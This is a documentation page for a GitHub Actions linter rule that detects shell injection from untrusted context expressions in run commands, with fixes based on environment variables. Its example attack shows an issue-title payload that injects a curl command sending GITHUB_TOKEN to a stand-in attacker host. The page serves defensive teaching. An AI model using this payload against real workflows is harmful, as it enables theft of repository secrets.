---
title: injection
parent: Linters
nav_order: 5
layout: default
render_with_liquid: false
---

# injection

Detects shell injection vulnerabilities from untrusted input in `run:` commands.

## Why This Matters

GitHub Actions expressions like `${{ github.event.issue.title }}` are evaluated before the shell runs. If an expression contains attacker-controlled content, it can inject arbitrary shell commands.

This is one of the most common security vulnerabilities in GitHub Actions workflows.

## What It Detects

Usage of dangerous GitHub context expressions directly in `run:` commands:

| Context | Risk |
|---------|------|
| `github.event.issue.title` | Attacker creates issue with malicious title |
| `github.event.issue.body` | Attacker creates issue with malicious body |
| `github.event.pull_request.title` | Attacker creates PR with malicious title |
| `github.event.pull_request.body` | Attacker creates PR with malicious body |
| `github.event.comment.body` | Attacker posts malicious comment |
| `github.event.review.body` | Attacker posts malicious review |
| `github.event.head_commit.message` | Attacker uses malicious commit message |
| `github.head_ref` | Attacker-controlled in forked PRs |

## Example Attack

### Vulnerable Workflow

```yaml
- run: echo "Processing ${{ github.event.issue.title }}"
```

### Attack Payload

An attacker creates an issue with title:

```
"; curl http://evil.com/steal?token=$GITHUB_TOKEN; echo "
```

### Resulting Command

```bash
echo "Processing "; curl http://evil.com/steal?token=$GITHUB_TOKEN; echo ""
```

The attacker has stolen your `GITHUB_TOKEN`.

## Example Output

```
ci.yml:15: (injection) Potential shell injection: dangerous context 'github.event.issue.title' used in run command
ci.yml:22: (injection) Potential shell injection: dangerous context 'github.head_ref' used in run command
```

## Auto-fix

**Not supported** - Fixing injection vulnerabilities requires restructuring the workflow to use environment variables.

## How to Fix

### Use Environment Variables

Instead of embedding expressions directly in shell commands, pass them through environment variables:

```yaml
# Bad - vulnerable to injection
- run: echo "Processing ${{ github.event.issue.title }}"

# Good - safe
- run: echo "Processing $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

When passed through environment variables, the content is properly escaped and cannot break out of the string context.

### Why This Works

| Method | What Happens |
|--------|--------------|
| Direct expression | Expression is literally pasted into shell script before execution |
| Environment variable | Expression is stored in env var, shell properly quotes/escapes it |

## Safe vs Unsafe Contexts

### Unsafe (Attacker-Controlled)

These can contain arbitrary content from external users:

- `github.event.issue.*`
- `github.event.pull_request.*`
- `github.event.comment.*`
- `github.event.review.*`
- `github.event.head_commit.message`
- `github.head_ref`
- `github.event.workflow_run.head_branch`

### Generally Safe

These are controlled by repository settings or GitHub itself:

- `github.repository`
- `github.ref`
- `github.sha`
- `github.actor` (with caveats)
- `secrets.*`

## Complex Example

### Before (Vulnerable)

```yaml
- name: Greet contributor
  run: |
    echo "Thank you ${{ github.event.pull_request.user.login }}!"
    echo "PR: ${{ github.event.pull_request.title }}"
    echo "Branch: ${{ github.head_ref }}"
```

### After (Safe)

```yaml
- name: Greet contributor
  run: |
    echo "Thank you $PR_AUTHOR!"
    echo "PR: $PR_TITLE"
    echo "Branch: $HEAD_REF"
  env:
    PR_AUTHOR: ${{ github.event.pull_request.user.login }}
    PR_TITLE: ${{ github.event.pull_request.title }}
    HEAD_REF: ${{ github.head_ref }}
```

## Additional Protections

### Use Actions Instead of Shell

Many tasks can be done with actions that handle input safely:

```yaml
# Instead of shell manipulation, use actions
- uses: peter-evans/create-or-update-comment@v3
  with:
    issue-number: ${{ github.event.issue.number }}
    body: "Thank you for your contribution!"
```

### Validate Input

If you must use user input, validate it first:

```yaml
- name: Validate branch name
  run: |
    if [[ ! "$BRANCH" =~ ^[a-zA-Z0-9_-]+$ ]]; then
      echo "Invalid branch name"
      exit 1
    fi
  env:
    BRANCH: ${{ github.head_ref }}
```

## See Also

- [GitHub Docs: Security hardening - Script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
